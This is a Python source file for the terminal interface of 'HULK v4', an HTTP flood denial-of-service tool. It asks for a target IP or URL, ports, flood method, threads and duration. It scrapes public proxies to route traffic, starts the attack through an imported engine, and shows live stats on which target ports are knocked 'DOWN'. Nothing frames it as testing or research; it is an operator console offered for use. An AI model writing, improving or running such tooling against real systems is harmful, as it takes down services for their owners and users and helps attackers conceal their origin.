#!/usr/bin/env python3

"""
HULK v4 — Server-Side Terminal UI
Rich-based interactive dashboard with live per-port attack stats.
"""

import asyncio
import locale
import os
import sys
import threading
import time
from typing import List, Optional

os.environ.setdefault("PYTHONIOENCODING", "utf-8")
try:
    sys.stdin.reconfigure(encoding="utf-8", errors="replace")
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import uvicorn
from rich.align import Align
from rich.console import Console, Group
from rich.live import Live
from rich.markup import escape
from rich.panel import Panel
from rich.prompt import Confirm, IntPrompt, Prompt
from rich.rule import Rule
from rich.table import Table
from rich.text import Text

from api import app
from attack_engine import engine
from config import settings
from models import AttackMethod, AttackStats, AttackStatus, PortStatus
from proxy_pool import proxy_pool
from proxy_scraper import scrape_proxies, save_proxies


console = Console()

DEFAULT_PORTS = [443, 2222, 8443]

BANNER = r"""
[bold green]
  ██╗  ██╗██╗   ██╗██╗     ██╗  ██╗
  ██║  ██║██║   ██║██║     ██║ ██╔╝
  ███████║██║   ██║██║     █████╔╝
  ██╔══██║██║   ██║██║     ██╔═██╗
  ██║  ██║╚██████╔╝███████╗██║  ██╗
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
[/bold green]
[dim]  ─── Server Edition v4.0 ───[/dim]
[dim]  All traffic originates from this server[/dim]
"""

MENU_OPTIONS = {
    "1": "Launch Attack",
    "2": "Stop Attack",
    "3": "Live Dashboard",
    "4": "Auto-Scrape Proxies",
    "5": "Load Proxies from File",
    "6": "Settings",
    "0": "Exit",
}


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def port_status_style(s: PortStatus) -> tuple:
    mapping = {
        PortStatus.ALIVE: ("🟢", "bold green"),
        PortStatus.DOWN: ("💀", "bold red"),
        PortStatus.PROTECTED: ("🛡", "bold magenta"),
        PortStatus.SKIPPED: ("⏭", "dim"),
    }
    return mapping.get(s, ("?", "white"))


def attack_status_display(s: AttackStatus) -> tuple:
    mapping = {
        AttackStatus.IDLE: ("⏸", "dim white", "IDLE"),
        AttackStatus.RUNNING: ("🔥", "bold green", "RUNNING"),
        AttackStatus.STOPPING: ("⏳", "bold yellow", "STOPPING"),
        AttackStatus.FINISHED: ("✅", "bold cyan", "FINISHED"),
        AttackStatus.ALL_DOWN: ("💀", "bold red on white", "ALL PORTS DOWN"),
        AttackStatus.ERROR: ("❌", "bold red", "ERROR"),
    }
    return mapping.get(s, ("?", "white", s.value))


def build_header_panel(stats: AttackStats) -> Panel:
    icon, color, label = attack_status_display(stats.status)

    grid = Table.grid(padding=(0, 3))
    grid.add_column(justify="right", style="bold cyan", min_width=16)
    grid.add_column(justify="left", min_width=30)

    grid.add_row("Target", f"[bold white]{escape(stats.target or '—')}[/]")
    grid.add_row("Status", f"[{color}]{icon} {label}[/]")
    grid.add_row("Method", f"[yellow]{stats.method or '—'}[/]")
    grid.add_row("Threads", f"[white]{stats.threads}[/]")
    grid.add_row("", "")
    grid.add_row("Total Requests", f"[bold white]{stats.total_requests:,}[/]")
    grid.add_row("Successful", f"[green]{stats.successful:,}[/]")
    grid.add_row("Failed", f"[red]{stats.failed:,}[/]")
    grid.add_row("Req/sec", f"[bold yellow]{stats.requests_per_second:,.1f}[/]")
    grid.add_row("Elapsed", f"[dim]{stats.elapsed:.1f}s[/]")
    if stats.proxies_loaded > 0:
        grid.add_row("Proxies", f"[magenta]{stats.proxies_loaded}[/]")

    return Panel(
        Align.center(grid),
        title="[bold white]⚡ Attack Overview[/]",
        border_style="green" if stats.status == AttackStatus.RUNNING else "dim",
        padding=(1, 2),
    )


def build_ports_panel(stats: AttackStats) -> Panel:
    table = Table(show_header=True, header_style="bold cyan", expand=True, pad_edge=True)
    table.add_column("Port", justify="center", width=8)
    table.add_column("Status", justify="center", width=14)
    table.add_column("Requests", justify="right", width=12)
    table.add_column("OK", justify="right", width=10, style="green")
    table.add_column("Fail", justify="right", width=10, style="red")
    table.add_column("Fail Streak", justify="right", width=12)
    table.add_column("Top Codes", justify="left", ratio=1)

    if not stats.ports:
        table.add_row("[dim]—[/]" * 7)
    else:
        for port in sorted(stats.ports.keys()):
            ps = stats.ports[port]
            icon, style = port_status_style(ps.status)

            top_codes = sorted(ps.status_codes.items(), key=lambda x: -x[1])[:5]
            codes_str = "  ".join(
                f"[{'green' if c < 400 else 'yellow' if c < 500 else 'red'}]{c}[/]:{n}"
                for c, n in top_codes
            ) if top_codes else "[dim]—[/]"

            streak_style = "red" if ps.consecutive_fails > 30 else "yellow" if ps.consecutive_fails > 10 else "dim"

            table.add_row(
                f"[bold white]{port}[/]",
                f"[{style}]{icon} {ps.status.value}[/]",
                f"{ps.total_requests:,}",
                f"{ps.successful:,}",
                f"{ps.failed:,}",
                f"[{streak_style}]{ps.consecutive_fails}[/]",
                codes_str,
            )

    alive = len(stats.alive_ports)
    down = len(stats.down_ports)
    total = len(stats.ports)
    summary = f"[green]{alive} alive[/] │ [red]{down} down[/] │ {total} total"

    return Panel(
        Group(table, Align.center(Text.from_markup(summary))),
        title="[bold white]🎯 Port Status[/]",
        border_style="cyan",
        padding=(1, 1),
    )


def build_dashboard(stats: AttackStats) -> Group:
    header = build_header_panel(stats)
    ports = build_ports_panel(stats)
    footer = Text.from_markup(
        f"  [bold yellow][Ctrl+C][/] [dim]Back to menu[/]  │  "
        f"[dim]API:[/] [bold cyan]http://{settings.host}:{settings.api_port}[/]"
    )
    return Group(header, ports, Align.center(footer))


def prompt_target() -> Optional[str]:
    console.print()
    console.print(Rule("[bold cyan]Target Configuration[/]"))
    console.print()

    target = Prompt.ask("[bold yellow]🎯 Enter target IP or URL[/]", console=console)
    if not target:
        return None

    target = target.strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    return target


def prompt_ports() -> List[int]:
    console.print()
    default_str = ", ".join(str(p) for p in DEFAULT_PORTS)
    console.print(f"[dim]Default ports: {default_str}[/]")

    raw = Prompt.ask(
        "[bold yellow]🔌 Ports[/] [dim](comma-separated, Enter for default)[/]",
        default=default_str,
        console=console,
    )

    ports = []
    for chunk in raw.split(","):
        chunk = chunk.strip()
        if chunk.isdigit():
            ports.append(int(chunk))

    return ports if ports else DEFAULT_PORTS


def prompt_method() -> AttackMethod:
    console.print()
    table = Table(show_header=False, box=None, padding=(0, 2))
    table.add_column(justify="center", style="bold yellow", width=4)
    table.add_column(justify="left")
    table.add_row("1", "[white]GET[/]   — standard flood")
    table.add_row("2", "[white]POST[/]  — payload flood")
    table.add_row("3", "[white]HEAD[/]  — lightweight probe")
    table.add_row("4", "[white]MIX[/]   — random rotation [dim](recommended)[/]")
    console.print(Panel(table, title="[bold]Attack Method[/]", border_style="yellow", padding=(1, 2)))

    choice = Prompt.ask("[bold yellow]Select method[/]", choices=["1", "2", "3", "4"], default="4", console=console)
    return {"1": AttackMethod.GET, "2": AttackMethod.POST, "3": AttackMethod.HEAD, "4": AttackMethod.MIX}[choice]


def prompt_threads() -> int:
    return IntPrompt.ask(
        "[bold yellow]⚙ Threads (concurrent requests)[/]",
        default=settings.default_threads,
        console=console,
    )


def prompt_duration() -> int:
    return IntPrompt.ask(
        "[bold yellow]⏱ Duration in seconds[/] [dim](0 = until stopped)[/]",
        default=0,
        console=console,
    )


def prompt_proxies() -> bool:
    if proxy_pool.count == 0:
        return False
    return Confirm.ask(
        f"[bold yellow]🌐 Use proxies? ({proxy_pool.count} loaded)[/]",
        default=False,
        console=console,
    )


def show_menu():
    console.print()
    table = Table(show_header=False, box=None, padding=(0, 3))
    table.add_column(justify="center", style="bold green", width=4)
    table.add_column(justify="left", style="white")

    is_running = engine.is_running
    for key, label in MENU_OPTIONS.items():
        if key == "2" and not is_running:
            table.add_row(f"[dim]{key}[/]", f"[dim]{label}[/]")
        elif key == "1" and is_running:
            table.add_row(f"[dim]{key}[/]", f"[dim]{label} (already running)[/]")
        else:
            table.add_row(key, label)

    if is_running:
        s = engine.stats.snapshot()
        alive = len(s.alive_ports)
        down = len(s.down_ports)
        status_line = (
            f"[bold green]● ACTIVE[/] → [white]{s.target}[/] │ "
            f"[yellow]{s.total_requests:,} reqs[/] │ "
            f"[cyan]{s.requests_per_second:.0f} r/s[/] │ "
            f"[green]{alive} alive[/] [red]{down} down[/]"
        )
    else:
        status_line = "[dim]● No active attack[/]"

    console.print(Panel(
        Group(Align.center(Text.from_markup(status_line)), table),
        title="[bold white]Menu[/]",
        border_style="green",
        padding=(1, 2),
    ))


async def do_attack():
    target = prompt_target()
    if not target:
        console.print("[red]No target specified.[/]")
        return

    ports = prompt_ports()
    method = prompt_method()
    threads = prompt_threads()
    duration = prompt_duration()
    use_proxies = prompt_proxies()

    console.print()
    console.print(Rule("[bold green]Launch Confirmation[/]"))

    summary = Table.grid(padding=(0, 2))
    summary.add_column(style="bold cyan", justify="right")
    summary.add_column(style="white")
    summary.add_row("Target", target)
    summary.add_row("Ports", ", ".join(str(p) for p in ports))
    summary.add_row("Method", method.value)
    summary.add_row("Threads", str(threads))
    summary.add_row("Duration", f"{duration}s" if duration else "∞ (until stopped)")
    summary.add_row("Proxies", f"{proxy_pool.count}" if use_proxies else "off")
    console.print(Panel(summary, border_style="green", padding=(1, 2)))

    if not Confirm.ask("[bold yellow]Confirm launch?[/]", console=console):
        console.print("[dim]Cancelled.[/]")
        return

    await engine.start(target, ports, method, threads, duration, use_proxies)
    console.print("[bold green]🔥 Attack launched! Opening dashboard...[/]")
    await asyncio.sleep(1)
    await do_dashboard()
    return


async def do_stop():
    if not engine.is_running:
        console.print("[yellow]No active attack.[/]")
        return
    console.print("[yellow]Stopping...[/]")
    await engine.stop()
    console.print("[green]Stopped.[/]")


async def do_dashboard():
    console.print()
    console.print("[dim]Live dashboard — Ctrl+C to return to menu[/]")
    console.print()

    try:
        with Live(console=console, refresh_per_second=4, screen=False) as live:
            idle_ticks = 0
            while True:
                stats = engine.stats.snapshot()
                if engine.last_error:
                    err_text = Text.from_markup(f"[bold red]⚠ {engine.last_error}[/]")
                    live.update(Group(build_dashboard(stats), Align.center(err_text)))
                else:
                    live.update(build_dashboard(stats))
                await asyncio.sleep(0.25)

                if stats.status in (AttackStatus.FINISHED, AttackStatus.ALL_DOWN, AttackStatus.ERROR) and not engine.is_running:
                    idle_ticks += 1
                    if idle_ticks > 20:
                        break
                else:
                    idle_ticks = 0
    except KeyboardInterrupt:
        pass


async def do_scrape_proxies():
    console.print()
    console.print("[bold cyan]Scraping proxies from 15+ public sources...[/]")

    with console.status("[bold green]Scraping...[/]", spinner="dots"):
        proxies = await scrape_proxies(check=False)

    if not proxies:
        console.print("[red]No proxies found.[/]")
        return

    path = "proxies.txt"
    save_proxies(proxies, path)
    count = proxy_pool.load_file(path)
    console.print(f"[bold green]✅ Scraped {len(proxies)} proxies, loaded {count} into pool.[/]")


def do_load_proxies():
    path = Prompt.ask("[bold yellow]📁 Path to proxy file[/]", default="proxies.txt", console=console)
    count = proxy_pool.load_file(path)
    if count:
        console.print(f"[green]Loaded {count} proxies.[/]")
    else:
        console.print("[red]No proxies found or file doesn't exist.[/]")


def do_settings():
    console.print()
    table = Table(title="Current Settings", show_header=True, header_style="bold cyan")
    table.add_column("Setting", style="bold white")
    table.add_column("Value", style="yellow")
    table.add_row("API Host", settings.host)
    table.add_row("API Port", str(settings.api_port))
    table.add_row("Default Threads", str(settings.default_threads))
    table.add_row("Max Threads", str(settings.max_threads))
    table.add_row("Request Timeout", f"{settings.request_timeout}s")
    table.add_row("Default Ports", ", ".join(str(p) for p in DEFAULT_PORTS))
    table.add_row("Proxy File", settings.proxy_file or "—")
    table.add_row("Proxies Loaded", str(proxy_pool.count))
    console.print(table)
    console.print("[dim]Configure via HULK_ environment variables.[/]")


def start_api_server():
    config = uvicorn.Config(app, host=settings.host, port=settings.api_port, log_level="error")
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()


async def main_loop():
    clear()
    console.print(BANNER)

    console.print(f"[dim]API starting on [bold]{settings.host}:{settings.api_port}[/]...[/]")
    start_api_server()
    await asyncio.sleep(0.5)
    console.print(f"[green]API ready → http://{settings.host}:{settings.api_port}[/]")
    console.print(f"[dim]Default ports: {', '.join(str(p) for p in DEFAULT_PORTS)}[/]")

    if settings.proxy_file:
        count = proxy_pool.load_file(settings.proxy_file)
        console.print(f"[magenta]Loaded {count} proxies[/]")

    while True:
        try:
            show_menu()
            choice = Prompt.ask("[bold green]>[/]", choices=list(MENU_OPTIONS.keys()), console=console)

            if choice == "1":
                if engine.is_running:
                    console.print("[yellow]Attack already running. Stop it first.[/]")
                else:
                    await do_attack()
            elif choice == "2":
                await do_stop()
            elif choice == "3":
                await do_dashboard()
            elif choice == "4":
                await do_scrape_proxies()
            elif choice == "5":
                do_load_proxies()
            elif choice == "6":
                do_settings()
            elif choice == "0":
                if engine.is_running:
                    if Confirm.ask("[yellow]Attack running. Stop and exit?[/]", console=console):
                        await engine.stop()
                    else:
                        continue
                console.print("[bold green]Goodbye.[/]")
                break

        except KeyboardInterrupt:
            console.print()
            continue
        except EOFError:
            break


def run():
    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        console.print("\n[bold green]Goodbye.[/]")


if __name__ == "__main__":
    run()
